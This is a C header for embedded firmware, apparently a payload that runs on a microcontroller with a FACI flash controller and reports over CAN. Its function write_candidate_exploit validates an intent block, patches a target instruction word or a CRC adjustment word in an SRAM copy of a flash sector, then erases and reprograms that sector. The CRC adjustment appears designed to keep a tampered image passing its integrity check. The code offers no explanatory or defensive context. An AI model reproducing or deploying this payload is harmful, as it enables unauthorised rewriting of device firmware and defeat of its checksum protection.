#ifndef SIENNA_CANDIDATE_WRITER_H
#define SIENNA_CANDIDATE_WRITER_H

#include "faci_dual.h"

#define CANDIDATE_INTENT_MAGIC 0x57524954u
#define CANDIDATE_INTENT_SCHEMA 1u
#define CANDIDATE_INTENT_LENGTH 0x80u
#define CANDIDATE_INTENT_CRC_OFFSET 124u
#define CANDIDATE_STAGE_COUNT 6u
#define TARGET_INSTRUCTION_OFFSET 0x64E4u
#define SOURCE_ADJUST_OFFSET 0x7DECu
#define ORIGINAL_ADJUST_WORD 0x0962887Fu
#define CANDIDATE_ADJUST_WORD 0x414F47CCu
#define TARGET_CONTEXT_TAG 0x54524754u
#define CRC_CONTEXT_TAG 0x43524353u

struct candidate_writer_intent {
  uint32_t magic;
  uint16_t schema;
  uint16_t length;
  uint8_t operation;
  uint8_t direction;
  uint16_t reserved0;
  uint32_t sector_base;
  uint32_t sram_address;
  uint32_t sram_length;
  uint32_t live_target_crc32;
  uint32_t live_crc_crc32;
  uint32_t candidate_crc32;
  uint8_t live_target_instruction[4];
  uint8_t live_adjustment[4];
  uint8_t candidate_context[4];
  uint32_t boot_magic0;
  uint32_t boot_magic1;
  uint8_t candidate_adjustment[4];
  uint32_t context_tag;
  uint8_t reserved[60];
  uint32_t crc32;
} __attribute__((packed));

const volatile struct candidate_writer_intent candidate_writer_intent_block
  __attribute__((section(".intent"),used))={0};
typedef char candidate_intent_size_check[
  sizeof(struct candidate_writer_intent)==CANDIDATE_INTENT_LENGTH?1:-1
];

static uint32_t crc_region32(
  const volatile uint8_t *data,
  uint32_t length,
  const struct runtime_guard *guard
) {
  uint32_t crc=0xFFFFFFFFu,index;
  for(index=0u;index<length;++index){
    crc=crc32_update(crc,data[index]);
    if((index&0x7FFu)==0u)feed_watchdog(guard);
  }
  return crc^0xFFFFFFFFu;
}

static uint32_t candidate_intent_crc(const struct runtime_guard *guard) {
  const volatile uint8_t *data=(const volatile uint8_t *)&candidate_writer_intent_block;
  uint32_t crc=crc_region32(data,CANDIDATE_INTENT_CRC_OFFSET,guard)^0xFFFFFFFFu;
  uint32_t index;
  for(index=0u;index<4u;++index)crc=crc32_update(crc,0u);
  return crc^0xFFFFFFFFu;
}

static uint32_t candidate_intent_word(uint32_t offset) {
  return MMIO32((uint32_t)&candidate_writer_intent_block+offset);
}

static void copy_sector_to_sram(
  uint32_t source_base,
  const struct runtime_guard *guard
) {
  uint32_t index;
  for(index=0u;index<TARGET_LENGTH;++index){
    SRAM_BUFFER[index]=MMIO8(source_base+index);
    if((index&0x7FFu)==0u)feed_watchdog(guard);
  }
}

static int validate_candidate_intent(const struct runtime_guard *guard) {
  uint32_t index;
  if(candidate_intent_word(0u)!=CANDIDATE_INTENT_MAGIC
    ||candidate_intent_word(4u)!=0x00800001u
    ||candidate_intent_word(8u)!=(WRITER_OPERATION|(WRITER_DIRECTION<<8))
    ||candidate_intent_word(12u)!=WRITER_SECTOR_BASE
    ||candidate_intent_word(16u)!=(uint32_t)SRAM_BUFFER
    ||candidate_intent_word(20u)!=TARGET_LENGTH
    ||candidate_intent_word(60u)!=WRITER_CONTEXT_TAG
    ||candidate_intent_crc(guard)!=candidate_intent_word(124u))return 1;
  for(index=0u;index<15u;++index)
    if(candidate_intent_word(64u+index*4u)!=0u)return 2;
  if(candidate_intent_word(48u)!=MAGIC_WORD||candidate_intent_word(52u)!=MAGIC_WORD
    ||MMIO32(MAGIC0_ADDRESS)!=MAGIC_WORD
    ||MMIO32(MAGIC1_ADDRESS)!=MAGIC_WORD)return 3;
  if(candidate_intent_word(40u)!=ORIGINAL_ADJUST_WORD
    ||candidate_intent_word(56u)!=CANDIDATE_ADJUST_WORD
    ||MMIO32(CRC_ADJUST)!=ORIGINAL_ADJUST_WORD)return 4;
  if(crc_region32((const volatile uint8_t *)TARGET_BASE,TARGET_LENGTH,guard)
      !=candidate_intent_word(24u)
    ||crc_region32((const volatile uint8_t *)CRC_SECTOR_BASE,TARGET_LENGTH,guard)
      !=candidate_intent_word(28u))return 5;
#if WRITER_OPERATION == PROTO_OP_WRITE_TARGET_CANDIDATE
  if(candidate_intent_word(36u)!=ORIGINAL_INSTRUCTION_WORD
    ||MMIO32(TARGET_BASE+TARGET_INSTRUCTION_OFFSET)!=ORIGINAL_INSTRUCTION_WORD
    ||candidate_intent_word(44u)!=PATCHED_INSTRUCTION_WORD)return 6;
  copy_sector_to_sram(WRITER_SECTOR_BASE,guard);
  MMIO32((uint32_t)SRAM_BUFFER+TARGET_INSTRUCTION_OFFSET)=PATCHED_INSTRUCTION_WORD;
  if(MMIO32((uint32_t)SRAM_BUFFER+TARGET_INSTRUCTION_OFFSET)!=PATCHED_INSTRUCTION_WORD)return 7;
#else
  if(candidate_intent_word(36u)!=PATCHED_INSTRUCTION_WORD
    ||MMIO32(TARGET_BASE+TARGET_INSTRUCTION_OFFSET)!=PATCHED_INSTRUCTION_WORD
    ||candidate_intent_word(44u)!=CANDIDATE_ADJUST_WORD)return 6;
  copy_sector_to_sram(WRITER_SECTOR_BASE,guard);
  MMIO32((uint32_t)SRAM_BUFFER+SOURCE_ADJUST_OFFSET)=CANDIDATE_ADJUST_WORD;
  if(MMIO32((uint32_t)SRAM_BUFFER+SOURCE_ADJUST_OFFSET)!=CANDIDATE_ADJUST_WORD)return 7;
#endif
  if(crc_region32(SRAM_BUFFER,TARGET_LENGTH,guard)!=candidate_intent_word(32u))return 8;
  return 0;
}

static int stream_candidate_sector(
  const volatile uint8_t *sector,
  const struct runtime_guard *guard,
  uint32_t *crc
) {
  return stream_sector(sector,guard,crc);
}

static void send_candidate_result(
  const volatile uint8_t *sector,
  uint32_t primary_stage,
  uint32_t primary_code,
  uint32_t exit_code,
  const struct runtime_guard *guard
) {
  uint32_t crc,stage,code;
  (void)can_send(PROTO_BEGIN0|(PROTO_VERSION<<8)|((uint32_t)WRITER_OPERATION<<16),WRITER_SECTOR_BASE,guard);
  (void)can_send(PROTO_BEGIN1|(PROTO_VERSION<<8)|((uint32_t)WRITER_OPERATION<<16)|(1u<<24),TARGET_LENGTH,guard);
  if(stream_candidate_sector(sector,guard,&crc)!=0)return;
  (void)send_magic(0u,MMIO32(MAGIC0_ADDRESS),guard);
  (void)send_magic(1u,MMIO32(MAGIC1_ADDRESS),guard);
  for(stage=0u;stage<CANDIDATE_STAGE_COUNT;++stage){
    code=stage==primary_stage?primary_code:(stage==4u?exit_code:0u);
    (void)can_send(PROTO_STATUS|((stage+1u)<<8),code,guard);
  }
  (void)can_send(PROTO_END,crc,guard);
}

static int candidate_exact_idle_snapshot(void) {
  uint32_t mismatch=FACI_FPMON^0x80u;
  mismatch |= FACI_FASTAT^0x8000u;
  mismatch |= FACI_FAESTAT;
  mismatch |= FACI_REG84;
  mismatch |= FACI_REG88;
  mismatch |= FACI_REG20;
  mismatch |= FLWL_REG;
  mismatch |= FLWE_REG;
  return mismatch==0u;
}

static uint32_t candidate_failure_cleanup(const struct runtime_guard *guard) {
  uint32_t cleanup_code=(uint32_t)failure_cleanup(guard);
  uint32_t idle_ok=(uint32_t)candidate_exact_idle_snapshot();
  if(cleanup_code!=0u)return cleanup_code;
  if(idle_ok==0u)return 4u;
  return 0u;
}

static void write_candidate_exploit(void)__attribute__((noinline,noreturn));
static void write_candidate_exploit(void) {
  struct runtime_guard guard;
  uint32_t failed_page=0u,primary_stage=6u,primary_code=0u,exit_code=0u;
  int error,exit_idle;
  __asm__ volatile("di");runtime_begin(&guard);
  error=validate_candidate_intent(&guard);
  if(error!=0){(void)send_error(1u,(uint32_t)error,&guard);goto halt;}
  if(!candidate_exact_idle_snapshot()){primary_stage=0u;primary_code=8u;goto readback;}
  error=enter_pe(&guard);if(error!=0){primary_stage=1u;primary_code=(uint32_t)error;exit_code=candidate_failure_cleanup(&guard);goto readback;}
  error=erase_sector(WRITER_SECTOR_BASE,&guard);if(error!=0){primary_stage=2u;primary_code=(uint32_t)error;exit_code=candidate_failure_cleanup(&guard);goto readback;}
  error=program_sector(WRITER_SECTOR_BASE,SRAM_BUFFER,&failed_page,&guard);
  if(error!=0){primary_stage=3u;primary_code=(failed_page<<16)|(uint32_t)error;exit_code=candidate_failure_cleanup(&guard);goto readback;}
  error=exit_pe(&guard);exit_idle=candidate_exact_idle_snapshot();
  if(error!=0||!exit_idle)exit_code=(uint32_t)(error!=0?error:4);
readback:
  send_candidate_result((const volatile uint8_t *)WRITER_SECTOR_BASE,primary_stage,primary_code,exit_code,&guard);
halt:
  runtime_end(&guard);for(;;){}
}

#endif
